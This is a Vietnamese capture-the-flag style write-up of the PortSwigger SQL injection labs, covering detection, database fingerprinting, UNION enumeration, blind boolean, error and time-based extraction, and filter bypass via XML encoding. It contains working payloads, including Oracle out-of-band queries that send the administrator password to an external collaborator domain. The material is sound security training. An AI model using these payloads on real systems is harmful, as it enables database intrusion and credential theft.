# SQL injection

## **Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

[Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

- Ở đây, câu lệnh thực thi sẽ có dạng `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` và chúng ta kiểm soát được input trong dấu nháy.
- Thử với dấu `'` thì response trả về `500` và `''` response trả về `200` ⇒ có thể có SQLi
- Thử truyền payload sau, nhân thấy response trả về là những sản phẩm chưa được phát hành ⇒ hoàn thành việc giải lab
    
    ![image.png](SQL%20injection/image.png)
    
    ![image.png](SQL%20injection/image%201.png)
    

## **Lab: SQL injection vulnerability allowing login bypass**

[Lab: SQL injection vulnerability allowing login bypass | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

- Trước hết, kiểm tra tại param `password` thử truyển dấu `'` thì server trả về `500`, `''` thì server trả về `200` ⇒ khả năng có SQLi
    
    ![image.png](SQL%20injection/image%202.png)
    
    ![image.png](SQL%20injection/image%203.png)
    
- Thực truyền biểu thức logic như sau, nhận thấy có thể login thành công với tài khoản `administrator` . Hoàn thành việc giải lab
    
    ![image.png](SQL%20injection/image%204.png)
    
    ![image.png](SQL%20injection/image%205.png)
    

## **Lab: SQL injection attack, querying the database type and version on Oracle**

[Lab: SQL injection attack, querying the database type and version on Oracle | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

- Trước hết, điều hướng đến chức năng tìm kiếm theo loại (ví dụ `Accessory`)
    
    ![image.png](SQL%20injection/image%206.png)
    
- Trong phần mềm Burpsuite, thực hiện kiểm tra SQLi với request gửi tới API `GET /filter` tại tham số `category` . Với dấu `'` server trả về `500`, với `''` server trả về `200` ⇒ có khả năng có SQLi.
    
    ![image.png](SQL%20injection/image%207.png)
    
    ![image.png](SQL%20injection/image%208.png)
    
- Vì ở đây, dữ liệu của truy vấn trả về ⇒ có thể dùng `UNION` để select được version qua đó giải lab thành công. Tuy nhiên, ở đây câu truy vấn gốc select 2 cột nên cần thêm một cột null, nếu thiếu sẽ gây lỗi
    
    ![image.png](SQL%20injection/image%209.png)
    
    ![image.png](SQL%20injection/image%2010.png)
    

## **Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

[Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

- Trước hết, điều hướng đến chức năng tìm kiếm theo loại (ví dụ `Accessory`)
    
    ![image.png](SQL%20injection/image%2011.png)
    
- Trong phần mềm Burpsuite, thực hiện kiểm tra SQLi với request gửi tới API `GET /filter` tại tham số `category` . Với dấu `'` server trả về `500`, với `''` server trả về `200` ⇒ có khả năng có SQLi.
    
    ![image.png](SQL%20injection/image%2012.png)
    
    ![image.png](SQL%20injection/image%2013.png)
    
- Ở đây, nếu payload mình truyền vào không có dấu space ở cuối thì sẽ bị `500` ⇒ MySQL
    
    ![image.png](SQL%20injection/image%2014.png)
    
    ![image.png](SQL%20injection/image%2015.png)
    
- Thực hiện tìm số côt ⇒ 2 cột
    
    ![image.png](SQL%20injection/image%2016.png)
    
    ![image.png](SQL%20injection/image%2017.png)
    
- Thực hiện lấy version, hoàn thành việc giải lab
    
    ![image.png](SQL%20injection/image%2018.png)
    
    ![image.png](SQL%20injection/image%2019.png)
    

## **Lab: SQL injection attack, listing the database contents on non-Oracle databases**

[Lab: SQL injection attack, listing the database contents on non-Oracle databases | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

- Thực hiện test xem có SQLi bằng cách thử dấu nháy
    
    ![image.png](SQL%20injection/image%2020.png)
    
    ![image.png](SQL%20injection/image%2021.png)
    
- Thực hiện dùng `UNION` để xác định Database version, số cột, dạng cột. Từ response trả về suy ra câu lệnh gốc truy vấn 2 cột đều có dạng string, và sử dụng Database **PostgreSQL**
    
    ![image.png](SQL%20injection/image%2022.png)
    
    ![image.png](SQL%20injection/image%2023.png)
    
    ![image.png](SQL%20injection/image%2024.png)
    
    ![image.png](SQL%20injection/image%2025.png)
    
- Enum tên bảng bằng lệnh sau
    
    ```jsx
    Accessories' union select (SELECT table_name FROM information_schema.tables limit 1),null-- 
    ```
    
    - Trong trường hợp muốn enum bảng khác có thể dùng lệnh sau:
        
        ```jsx
        Accessories' union select (SELECT table_name FROM information_schema.tables where table_name != users_ljpekn limit 1),null-- 
        ```
        
    
    ![image.png](SQL%20injection/image%2026.png)
    
- Tiếp theo cần enum tên cột ⇒  sử dụng câu lệnh sau để lấy được cột lưu username, password
    
    ```jsx
    ' AND 1=0 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ljpekn' LIMIT 1 OFFSET 2--
    ```
    
    ```jsx
    ' AND 1=0 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ljpekn' LIMIT 1 OFFSET 1--
    ```
    
    ![image.png](SQL%20injection/image%2027.png)
    
    ![image.png](SQL%20injection/image%2028.png)
    
- Thực hiện lấy password và hoàn thành lab
    
    ![image.png](SQL%20injection/image%2029.png)
    
    ![image.png](SQL%20injection/image%2030.png)
    

## **Lab: SQL injection attack, listing the database contents on Oracle**

[Lab: SQL injection attack, listing the database contents on Oracle | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

- Thực hiện test có SQLi không bằng nháy
    
    ![image.png](SQL%20injection/image%2031.png)
    
    ![image.png](SQL%20injection/image%2032.png)
    
- Tiếp theo là xác định database type, column type → Oracle và cả 2 cột trong câu truy vấn gốc là dạng string
    
    
    ![image.png](SQL%20injection/image%2033.png)
    
    ![image.png](SQL%20injection/image%2034.png)
    
    ![image.png](SQL%20injection/image%2035.png)
    
- Tiếp theo là xác định tên tables là `USERS_ENGYTN`
    
    ```jsx
    Accessories' union select table_name,'aa' from all_tables--
    ```
    
    ![image.png](SQL%20injection/image%2036.png)
    
- Sau đó thì enum cột
    
    ```jsx
    Accessories' union select column_name,'aa' from all_tab_columns  where table_name='USERS_ENGYTN'--
    ```
    
    ![image.png](SQL%20injection/image%2037.png)
    
- Cuối cùng, thực hiện lấy account administrator. Đăng nhập bằng account lấy được và hoàn thành lab
    
    ![image.png](SQL%20injection/image%2038.png)
    
    ![image.png](SQL%20injection/image%2039.png)
    

## **Lab: SQL injection UNION attack, determining the number of columns returned by the query**

[Lab: SQL injection UNION attack, determining the number of columns returned by the query | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

- Trước hết kiểm tra có SQLi không
    
    ![image.png](SQL%20injection/image%2040.png)
    
    ![image.png](SQL%20injection/image%2041.png)
    
- Xác định database type, số lượng cột. Sử dụng `' or '1'='1'--` để loại **MySQL**  và db khác → db khác. Tiếp theo thử `' or '1'=()--`  trong ngoặc sẽ chọn các câu select version khác nhau để xác định db. Cuối cùng xác định được db là **PosgreSQL**
    
    ![image.png](SQL%20injection/image%2042.png)
    
    ![image.png](SQL%20injection/image%2043.png)
    
    ![image.png](SQL%20injection/image%2044.png)
    
- Cuối cùng xác định số lượng cột bằng cách sau (thay đổi số lượng null đến khi status code trả về 200). Suy ra có 3 cột. Hoàn thành việc giải lab.
    
    ![image.png](SQL%20injection/image%2045.png)
    
    ![image.png](SQL%20injection/image%2046.png)
    

## **Lab: SQL injection UNION attack, finding a column containing text**

[Lab: SQL injection UNION attack, finding a column containing text | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

- Trước hết, xác định có SQLi không
    
    ![image.png](SQL%20injection/image%2047.png)
    
    ![image.png](SQL%20injection/image%2048.png)
    
- Trước hết xác định db type. Ở đây, với việc sử dụng payload này có thể khẳng định không phải MySQL
    
    ![image.png](SQL%20injection/image%2049.png)
    
- Sau đó, sử dụng các câu lệnh truy vấn version để xác định được db type đúng. Ở đây suy ra **PosgreSQL**
    
    ![image.png](SQL%20injection/image%2050.png)
    
- Xác định số cột bằng 3 (thay đổi số lượng null để xác định số cột chính xác)
    
    ![image.png](SQL%20injection/image%2051.png)
    
- Xác định được cột 2 có dạng text
    
    ![image.png](SQL%20injection/image%2052.png)
    
- Truyền đoạn text mà lab yêu cầu để hoàn thiện giải lab
    
    ![image.png](SQL%20injection/image%2053.png)
    

## **Lab: SQL injection UNION attack, retrieving data from other tables**

[Lab: SQL injection UNION attack, retrieving data from other tables | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

- Trước hết check xem có SQLi
    
    ![image.png](SQL%20injection/image%2054.png)
    
    ![image.png](SQL%20injection/image%2055.png)
    
- Sau đó xác định được db type, số lượng cột là **PosgreSQL** và có 2 cột
    
    ![image.png](SQL%20injection/image%2056.png)
    
    ![image.png](SQL%20injection/image%2057.png)
    
- Đề bài có cho sẵn tên bảng và cột, thực hiện payload sau lấy được username:password
    
    ![image.png](SQL%20injection/image%2058.png)
    
- Login và hoàn thành giải lab
    
    ![image.png](SQL%20injection/image%2059.png)
    

## **Lab: SQL injection UNION attack, retrieving multiple values in a single column**

[Lab: SQL injection UNION attack, retrieving multiple values in a single column | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

- Trước hết kiểm tra xem có SQLi không
    
    ![image.png](SQL%20injection/image%2060.png)
    
    ![image.png](SQL%20injection/image%2061.png)
    
- Tiếp theo xác định db type, số lượng cột, dạng cột. Sử dụng payload trong hình để có thể xác định chính xác. Ở đây, db là **PosgreSQL**, có 2 cột, và cột 2 có dạng text
    
    ![image.png](SQL%20injection/image%2062.png)
    
    ![image.png](SQL%20injection/image%2063.png)
    
    ![image.png](SQL%20injection/image%2064.png)
    
    ![image.png](SQL%20injection/image%2065.png)
    
- Cuối cùng, xác định credential dựa trên cấu trúc bảng mà đề cho. Ở vì chỉ có cột 2 là dạng text nên ta có thể concat chuỗi để trả về
    
    ![image.png](SQL%20injection/image%2066.png)
    
- Thực hiện login thành công hoàn thành giải lab
    
    ![image.png](SQL%20injection/image%2067.png)
    

## **Lab: Blind SQL injection with conditional responses**

[Lab: Blind SQL injection with conditional responses | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

- Trước hết test xem có SQLi ở vị trí `TrackingId`→ `'`  `''` cho response giống nhau và cho `Content-length` khác response của `TrackingId` hợp lệ. Tuy nhiên khi sử dụng `'||'` thì cho response giống `TrackingId` hợp lệ → có nối chuỗi được → có SQLi ở đây:
    
    ![image.png](SQL%20injection/image%2068.png)
    
    ![image.png](SQL%20injection/image%2069.png)
    
    ![image.png](SQL%20injection/image%2070.png)
    
- Tiếp theo là đoán DB type bằng cách dùng truy vấn version  → **PostgreSQL**
    
    ![image.png](SQL%20injection/image%2071.png)
    
    ![image.png](SQL%20injection/image%2072.png)
    
- Ở đây chỉ có `Content-Length` là khác biệt giữa query đúng và query sai → blind, tuy nhiên thì hàm `pg_sleep()` không hoạt động nên chỉ có thể dùng biểu thức sau để đoán các ký tự
    
    ```jsx
    Z1j' or (SELECT password from users where username='administrator') like '%' and '1'='1
    ```
    
    - Hoặc ở đây cũng có thể sử dụng `SUBSTRING()` để chạy từng ký tự và có thể dùng BurpIntruder
        
        ```jsx
        Z1j' or 'p'=substring((SELECT password from users where username='administrator'),1,1) and '1'='1
        ```
        
- Tiếp theo là cần tìm được độ dài password phục vụ cho việc truyền vào hàm substring ở bước sau
    - Thực hiện config BurpIntruder như sau:
        
        ![image.png](SQL%20injection/image%2073.png)
        
    - Kết quả chạy:
        
        ![image.png](SQL%20injection/image%2074.png)
        
- Sau đó, ta sẽ lấy độ dài từ bước trước và config BurpIntruder như sau để lấy được password và login
    - Sử dụng `Cluster bomb` để  bruteforce
    - Với vị trí đầu config như sau:
        
        ![image.png](SQL%20injection/image%2075.png)
        
    - Với vị trí hai, config như sau:
        
        ![image.png](SQL%20injection/image%2076.png)
        
    - Kết quả:
        
        ![image.png](SQL%20injection/image%2077.png)
        
- Login với credential `administrator:p11hyydslj4wejvyykn6` . Hoàn thành việc giải lab
    
    ![image.png](SQL%20injection/image%2078.png)
    

## **Lab: Blind SQL injection with conditional errors**

[Lab: Blind SQL injection with conditional errors | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

- Trước hết, test có SQLi không bằng cách sử dụng dấu `'`, `''` → có khác nhau về status code trả về  → có thể có SQLi
    
    ![image.png](SQL%20injection/image%2079.png)
    
    ![image.png](SQL%20injection/image%2080.png)
    
- Tuy nhiên khi dùng `' or '1'='1` và `' or '1'='2` thì response để trả về như nhau → kết quả request không có ích → cần trigger error
    
    ![image.png](SQL%20injection/image%2081.png)
    
    ![image.png](SQL%20injection/image%2082.png)
    
- Xác định DB type → nếu lệnh không hợp lệ sẽ trả về 500 (error) từ đó xác định DB là **Oracle**
    - Với DB sai
        
        ![image.png](SQL%20injection/image%2083.png)
        
    - Với DB đúng
        
        ![image.png](SQL%20injection/image%2084.png)
        
- Vậy thì chúng ta sẽ xác định độ dài password trước  bằng cách dùng payload sau:
    
    ```jsx
    9lfwbcnv' or '1'=(SELECT CASE WHEN (1=(select LENGTH(password) from users where username='administrator')) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)  and '1'='1
    ```
    
    - Config BurpIntruder như sau:
        
        ![image.png](SQL%20injection/image%2085.png)
        
    - Kết quả chạy:
        
        ![image.png](SQL%20injection/image%2086.png)
        
    - Từ đó suy ra password có độ dài 20
- Tiếp theo lấy password bằng payload sau:
    
    ```jsx
    9lfwbcnv' or 'a'=(substr((select password from users where username='administrator'),1,1)) and '1'='1
    ```
    
    - Config BurpIntruder như sau:
        - Chế độ chạy:
            
            ![image.png](SQL%20injection/image%2087.png)
            
        - Với vị trí 1:
            
            ![image.png](SQL%20injection/image%2088.png)
            
        - Với vị trí 2:
            
            ![image.png](SQL%20injection/image%2089.png)
            
    - Kết quả chạy
        
        ![image.png](SQL%20injection/image%2090.png)
        
    - Password lấy được là `xlbofbb8ql7ffq36nb9j`
- Thực hiện login bằng account `administrator:xlbofbb8ql7ffq36nb9j` . Hoàn thành giải lab
    
    ![image.png](SQL%20injection/image%2091.png)
    

## **Lab: Visible error-based SQL injection**

[Lab: Visible error-based SQL injection | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

- Trước hết, kiểm tra SQLi bằng các sử dụng `'` , `''` → `'` trả về 500 và `''` trả về 200 → có thể có SQLi
    - Với dấu `'`
        
        ![image.png](SQL%20injection/image%2092.png)
        
    - Với dấu `''`
        
        ![image.png](SQL%20injection/image%2093.png)
        
- Tiếp theo là enum DB
    - Với DB sai response sẽ trả về status code 500
        
        ![image.png](SQL%20injection/image%2094.png)
        
    - Với DB đúng response sẽ trả về status code 200
        
        ![image.png](SQL%20injection/image%2095.png)
        
    - Từ đó kết luận DB là **PostgreSQL**
- Ở trong lab này, khi truy vấn sai syntax khiến cho query lỗi thì sẽ có thông báo trả về response → có thể lấy được thông tin qua thông báo lỗi. Ở đây, DB là **PostgreSQL** nên ta sẽ sử dụng payload sau để trigger lỗi
    
    ```jsx
    CAST((SELECT password FROM users LIMIT 1) AS int)
    ```
    
    - Kết quả khi sử dụng payload trên
        
        ![image.png](SQL%20injection/image%2096.png)
        
- Từ đó lấy được credential là `administrator:dq1p6enmi3c3mg4v10pz`. Thực hiện đăng nhập và hoàn thành việc giải lab
    
    ![image.png](SQL%20injection/image%2097.png)
    

## **Lab: Blind SQL injection with time delays**

[Lab: Blind SQL injection with time delays | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

- Trước hết, thử các chèn dấu `'`, `''` nhưng đều không khác biệt. Ngoài ra cũng không thể trigger error → thử time based thì được
    
    ![image.png](SQL%20injection/image%2098.png)
    
- Từ đây suy ra được DB là **PostgreSQL**. Tuy nhiên thì lab này chỉ yêu cầu trigger time delay vậy là hoàn thành giải lab
    
    ![image.png](SQL%20injection/image%2099.png)
    

## **Lab: Blind SQL injection with time delays and information retrieval**

[Lab: Blind SQL injection with time delays and information retrieval | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

- Trước hết, thử sử dụng chèn `'` thì không gây ra lỗi hay response khác biệt → thử sử dụng time based thì delay được → có SQLi
    
    ![image.png](SQL%20injection/image%20100.png)
    
- Từ đó cũng suy ra được DB là **PostgreSQL**. Sử dụng payload sau để xác định được độ dài của password
    
    ```jsx
    6hbyp5EftWaDbcZu'; SELECT CASE WHEN (20=(select length(password) from users where username='administrator')) THEN pg_sleep(10) ELSE pg_sleep(0) END--
    ```
    
    - Config BurpIntruder như sau:
        
        ![image.png](SQL%20injection/image%20101.png)
        
        ![image.png](SQL%20injection/image%20102.png)
        
    - Kết quả chạy:
        
        ![image.png](SQL%20injection/image%20103.png)
        
    - Suy ra độ dài password là 20
    
- Sau đó, với độ dài password tìm được, config BurpIntruder như sau để tìm mật khẩu
    - Sử dụng `Cluster bomb`
        
        ![image.png](SQL%20injection/image%20104.png)
        
    - Vị trí payload đầu tiên, config như sau:
        
        ![image.png](SQL%20injection/image%20105.png)
        
        ![image.png](SQL%20injection/image%20106.png)
        
    - Vị trí payload thứ hai, config như sau:
        
        ![image.png](SQL%20injection/image%20107.png)
        
    - Kết quả chạy:
        
        ![image.png](SQL%20injection/image%20108.png)
        
    - Từ đó suy ra được password là `mkrjr997t8z1pyjn9idv`
- Thực hiện login với credential `administrator:mkrjr997t8z1pyjn9idv` . Hoàn thành giải lab
    
    ![image.png](SQL%20injection/image%20109.png)
    

## **Lab: Blind SQL injection with out-of-band interaction**

[Lab: Blind SQL injection with out-of-band interaction | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

- Thực hiện thử chèn `'` không gây ra khác biệt về response. Tiếp theo dùng time base cũng không được. Sau đó, sử dụng oob thì được. Ở đây, chúng ta nên thực hiện tiếp tục nối query chứ không nên ngắt query trước đó vì có thể một số db không cho phép thực hiện **Batched Query** (như Oracle).
- Ở bài này, chúng ta chỉ cần trigger được oob là hoàn thành giải lab
    - Payload sử dụng
        
        ```jsx
        7t4R9mXVUu7hFiV7' or 1=(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://6mtiib43bzxxm7w1mwcab4mqlhr8f43t.oastify.com/"> %remote;]>'),'/l') FROM dual) or '1'='1
        ```
        
    - Kết quả
        - Thực hiện gửi request
            
            ![image.png](SQL%20injection/image%20110.png)
            
        - Trigger thành công
            
            ![image.png](SQL%20injection/image%20111.png)
            
        - Kết quả hoàn thành lab
            
            ![image.png](SQL%20injection/image%20112.png)
            

## **Lab: Blind SQL injection with out-of-band data exfiltration**

[Lab: Blind SQL injection with out-of-band data exfiltration | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

- Trước hết thử chèn `'` , time based đều không được. Sau đó, thử payload oob thì trigger được Burp collab
    - Payload sử dụng:
        
        ```jsx
        cUkmvStjJs02avX2' or (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://hbwt7mte0am8bilcb71l0fb1asgj4lsa.oastify.com/"> %remote;]>'),'/l') FROM dual)  or '1'='1
        ```
        
    - Gửi request
        
        ![image.png](SQL%20injection/image%20113.png)
        
    - Trigger thành công collab
        
        ![image.png](SQL%20injection/image%20114.png)
        
- Sau đó, thực hiện lấy `password` bằng cách nối vào burp domain và gửi về burp collab
    - Payload
        
        ```jsx
        cUkmvStjJs02avX2'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hpatlm7eea08pizcp7flefp1osujio6d.oastify.com/"> %remote;]>'),'/l') FROM dual)||'
        ```
        
    - Gửi request
        
        ![image.png](SQL%20injection/image%20115.png)
        
    - Trigger thành công và lấy được password là `q2s6ccr9jriajag31g8h`
        
        ![image.png](SQL%20injection/image%20116.png)
        
- Login bằng `password` lấy được. Hoàn thành việc giải lab
    
    ![image.png](SQL%20injection/image%20117.png)
    

## **Lab: SQL injection with filter bypass via XML encoding**

[Lab: SQL injection with filter bypass via XML encoding | Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

- Ở bài lab này, khi chúng ta nhập các ký tự như `'` vào param `<productId>` trong request gửi tới API `POST /product/stock` thì sẽ bị chặn → burp scan không scan ra SQLi
- Tuy nhiên, thì khi chèn payload sau, có thể trích xuất nhiều hơn các sản phẩm so với response ban đầu → có SQLi
    - Payload
        
        ```jsx
        &#111;r &#39;1&#39;=&#39;1&#39;
        ```
        
    - Response ban đầu
        
        ![image.png](SQL%20injection/image%20118.png)
        
    - Response lúc sau
        
        ![image.png](SQL%20injection/image%20119.png)
        
- Vì query ở đây chỉ trả về 1 trường nên có thể đoán request phía dev sử dụng dạng như này
    
    ```jsx
    select level from stock_level where product_id = $pid and store_id = $sid
    ```
    
- Từ đó có thể enum db, tên bảng, lấy được password.
    - Payload enum db
        
         
        
        ```jsx
        1 &#117;nion &#115;elect TABLE_NAME   from information_schema.tables&#45;&#45;
        ```
        
    - Request gửi để enum db. Từ đó suy ra db sử dụng không phải **Oracle** đồng thời enum ra các bảng có trng db
        
        ![image.png](SQL%20injection/image%20120.png)
        
    - Tiếp theo enum tên cột, ta sẽ enum cột của bảng `users`
        - Các bảng có trong đó có bảng `users`
            
            ![image.png](SQL%20injection/image%20121.png)
            
        - Các cột có trong bảng `users`
            
            ![image.png](SQL%20injection/image%20122.png)
            
        - Lấy `username` và `password` như sau:
            
            ![image.png](SQL%20injection/image%20123.png)
            
            ![image.png](SQL%20injection/image%20124.png)
            
- Login và hoàn thành giải lab
    
    ![image.png](SQL%20injection/image%20125.png)